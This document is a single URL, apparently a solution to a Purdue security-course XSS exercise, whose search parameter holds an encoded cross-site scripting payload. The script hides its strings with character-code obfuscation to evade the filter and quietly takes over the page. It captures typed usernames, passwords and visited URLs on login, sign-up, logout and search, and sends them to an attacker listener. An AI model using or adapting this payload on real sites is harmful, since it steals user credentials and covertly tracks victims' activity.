http://cs526-s18.cs.purdue.edu/project3/search?xssdefense=3&q=%3Cscript%3Efunction%20payload(attacker%2C%20target)%20%7B%0A%09function%20send_to_attacker(data)%20%7B%0A%09%09const%20stolen_str%20%3D%20String.fromCharCode(115%2C116%2C111%2C108%2C101%2C110)%3B%0A%09%09%24.ajax(%7B%0A%09%09%09url%3A%20attacker%20%2B%20stolen_str%2C%0A%09%09%09data%0A%09%09%7D)%3B%0A%09%7D%0A%0A%09const%20html_str%20%3D%20String.fromCharCode(104%2C116%2C109%2C108)%3B%0A%09const%20root_str%20%3D%20String.fromCharCode(46%2C47)%3B%0A%0A%09function%20request_to_server(href%2C%20type%2C%20data)%20%7B%0A%09%09%24.ajax(%7B%0A%09%09%09url%3A%20target%20%2B%20href%2C%0A%09%09%09type%2C%0A%09%09%09data%2C%0A%09%09%09success%3A%20function(data)%20%7B%0A%09%09%09%09%24(html_str).hide()%3B%0A%09%09%09%09%24(html_str).html(data)%3B%0A%09%09%09%09register_events()%3B%0A%09%09%09%09%24(html_str).show()%3B%0A%09%09%09%7D%0A%09%09%7D)%3B%0A%09%7D%0A%09%0A%09function%20register_events()%20%7B%0A%09%09const%20GET_str%20%3D%20String.fromCharCode(71%2C69%2C84)%3B%0A%09%09const%20nav_str%20%3D%20String.fromCharCode(110%2C97%2C118)%3B%0A%09%09const%20search_again_btn_id%20%3D%20String.fromCharCode(35%2C115%2C101%2C97%2C114%2C99%2C104%2C45%2C97%2C103%2C97%2C105%2C110%2C45%2C98%2C116%2C110)%3B%0A%0A%09%09%24(search_again_btn_id).click(function(event)%20%7B%0A%09%09%09event.preventDefault()%3B%0A%0A%09%09%09const%20logged_in_user_id%20%3D%20String.fromCharCode(35%2C108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114)%3B%0A%0A%09%09%09const%20user%20%3D%20%24(logged_in_user_id).text()%3B%0A%09%09%09const%20url%20%3D%20target%3B%0A%0A%09%09%09if%20(user)%20%7B%0A%09%09%09%09send_to_attacker(%7B%0A%09%09%09%09%09event%3A%20nav_str%2C%0A%09%09%09%09%09user%2C%0A%09%09%09%09%09url%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09send_to_attacker(%7B%0A%09%09%09%09%09event%3A%20nav_str%2C%0A%09%09%09%09%09url%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%0A%09%09%09request_to_server(root_str%2C%20GET_str)%3B%0A%09%09%7D)%3B%0A%0A%09%09const%20search_btn_id%20%3D%20String.fromCharCode(35%2C115%2C101%2C97%2C114%2C99%2C104%2C45%2C98%2C116%2C110)%3B%0A%09%09const%20logged_in_user_id%20%3D%20String.fromCharCode(35%2C108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114)%3B%0A%0A%09%09const%20search_q_str%20%3D%20String.fromCharCode(34%2C47%2C115%2C101%2C97%2C114%2C99%2C104%2C63%2C113%2C61)%3B%0A%09%09const%20search_str%20%3D%20String.fromCharCode(46%2C47%2C115%2C101%2C97%2C114%2C99%2C104)%3B%0A%0A%09%09%24(search_btn_id).click(function(event)%20%7B%0A%09%09%09event.preventDefault()%3B%0A%0A%09%09%09const%20query_id%20%3D%20String.fromCharCode(35%2C113%2C117%2C101%2C114%2C121)%3B%0A%0A%09%09%09const%20content%20%3D%20%24(query_id).val()%3B%0A%0A%09%09%09const%20user%20%3D%20%24(logged_in_user_id).text()%3B%0A%09%09%09const%20url%20%3D%20target%20%2B%20search_q_str%20%2B%20content%3B%0A%0A%09%09%09if%20(user)%20%7B%0A%09%09%09%09send_to_attacker(%7B%0A%09%09%09%09%09event%3A%20nav_str%2C%0A%09%09%09%09%09user%2C%0A%09%09%09%09%09url%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09send_to_attacker(%7B%0A%09%09%09%09%09event%3A%20nav_str%2C%0A%09%09%09%09%09url%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%0A%09%09%09request_to_server(search_str%2C%20GET_str%2C%20%7Bq%3A%20content%7D)%3B%0A%09%09%7D)%3B%0A%0A%09%09const%20log_in_btn_id%20%3D%20String.fromCharCode(35%2C108%2C111%2C103%2C45%2C105%2C110%2C45%2C98%2C116%2C110)%3B%0A%0A%09%09const%20username_id%20%3D%20String.fromCharCode(35%2C117%2C115%2C101%2C114%2C110%2C97%2C109%2C101)%3B%0A%09%09const%20userpass_id%20%3D%20String.fromCharCode(35%2C117%2C115%2C101%2C114%2C112%2C97%2C115%2C115)%3B%0A%0A%09%09const%20POST_str%20%3D%20String.fromCharCode(80%2C79%2C83%2C84)%3B%0A%0A%0A%09%09%24(log_in_btn_id).click(function(event)%20%7B%0A%09%09%09event.preventDefault()%3B%0A%0A%09%09%09const%20user%20%3D%20%24(username_id).val()%3B%0A%09%09%09const%20pass%20%3D%20%24(userpass_id).val()%3B%0A%0A%09%09%09const%20login_str%20%3D%20String.fromCharCode(108%2C111%2C103%2C105%2C110)%0A%0A%09%09%09send_to_attacker(%7B%0A%09%09%09%09event%3A%20login_str%2C%0A%09%09%09%09user%2C%0A%09%09%09%09pass%0A%09%09%09%7D)%3B%0A%0A%09%09%09%2F%2F%20.%2Flogin%0A%09%09%09const%20login_str_2%20%3D%20String.fromCharCode(46%2C47%2C108%2C111%2C103%2C105%2C110)%3B%0A%0A%09%09%09request_to_server(login_str_2%2C%20POST_str%2C%20%7Busername%3A%20user%2C%20password%3A%20pass%7D)%3B%0A%09%09%7D)%3B%0A%0A%09%09const%20log_out_btn_id%20%3D%20String.fromCharCode(35%2C108%2C111%2C103%2C45%2C111%2C117%2C116%2C45%2C98%2C116%2C110)%3B%0A%0A%09%09%24(log_out_btn_id).click(function(event)%20%7B%0A%09%09%09event.preventDefault()%3B%0A%0A%09%09%09const%20user%20%3D%20%24(logged_in_user_id).text()%3B%0A%0A%09%09%09const%20logout_str%20%3D%20String.fromCharCode(108%2C111%2C103%2C111%2C117%2C116)%3B%0A%0A%09%09%09send_to_attacker(%7B%0A%09%09%09%09event%3A%20logout_str%2C%0A%09%09%09%09user%0A%09%09%09%7D)%3B%0A%0A%09%09%09%2F%2F%20.%2Flogout%0A%09%09%09const%20logout_str_2%20%3D%20String.fromCharCode(46%2C47%2C108%2C111%2C103%2C111%2C117%2C116)%3B%0A%0A%09%09%09request_to_server(logout_str_2%2C%20POST_str)%3B%0A%09%09%7D)%3B%0A%0A%09%09const%20new_account_btn_id%20%3D%20String.fromCharCode(35%2C110%2C101%2C119%2C45%2C97%2C99%2C99%2C111%2C117%2C110%2C116%2C45%2C98%2C116%2C110)%0A%0A%09%09%24(new_account_btn_id).click(function(event)%20%7B%0A%09%09%09event.preventDefault()%3B%0A%0A%09%09%09const%20user%20%3D%20%24(username_id).val()%3B%0A%09%09%09const%20pass%20%3D%20%24(userpass_id).val()%3B%0A%0A%09%09%09const%20create_str%20%3D%20String.fromCharCode(99%2C114%2C101%2C97%2C116%2C101)%3B%0A%0A%09%09%09send_to_attacker(%7B%0A%09%09%09%09event%3A%20create_str%2C%0A%09%09%09%09user%2C%0A%09%09%09%09pass%0A%09%09%09%7D)%3B%0A%0A%09%09%09%2F%2F%20.%2Fcreate%0A%09%09%09const%20create_str_2%20%3D%20String.fromCharCode(46%2C47%2C99%2C114%2C101%2C97%2C116%2C101)%3B%0A%0A%09%09%09request_to_server(create_str_2%2C%20POST_str%2C%20%7Busername%3A%20user%2C%20password%3A%20pass%7D)%3B%0A%09%09%7D)%3B%0A%0A%0A%09%09const%20history_class%20%3D%20String.fromCharCode(97%2C46%2C104%2C105%2C115%2C116%2C111%2C114%2C121%2C45%2C105%2C116%2C101%2C109%2C46%2C108%2C105%2C115%2C116%2C45%2C103%2C114%2C111%2C117%2C112%2C45%2C105%2C116%2C101%2C109)%3B%0A%0A%09%09%24(history_class).click(function(event)%20%7B%0A%09%09%09event.preventDefault()%3B%0A%0A%09%09%09const%20content%20%3D%20%24(this).text()%3B%0A%0A%09%09%09const%20user%20%3D%20%24(logged_in_user_id).text()%3B%0A%09%09%09const%20url%20%3D%20target%20%2B%20search_q_str%20%2B%20content%3B%0A%0A%09%09%09send_to_attacker(%7B%0A%09%09%09%09event%3A%20nav_str%2C%0A%09%09%09%09user%2C%0A%09%09%09%09url%0A%09%09%09%7D)%3B%0A%0A%09%09%09request_to_server(search_str%2C%20GET_str%2C%20%7Bq%3A%20content%7D)%3B%0A%09%09%7D)%3B%0A%09%7D%0A%0A%09%24(html_str).hide()%3B%0A%09%24(html_str).load(root_str%2C%20function()%20%7B%0A%09%09register_events()%3B%0A%09%09%24(html_str).show()%3B%0A%09%7D)%3B%0A%7D%0Aconst%20attacker_str%20%3D%20String.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C49%2C50%2C55%2C46%2C48%2C46%2C48%2C46%2C49%2C58%2C51%2C49%2C51%2C51%2C55%2C47)%0Aconst%20target_str%20%3D%20String.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C99%2C115%2C53%2C50%2C54%2C45%2C115%2C49%2C56%2C46%2C99%2C115%2C46%2C112%2C117%2C114%2C100%2C117%2C101%2C46%2C101%2C100%2C117%2C47%2C112%2C114%2C111%2C106%2C101%2C99%2C116%2C51%2C47)%0Apayload(attacker_str%2Ctarget_str)%3C%2Fscript%3E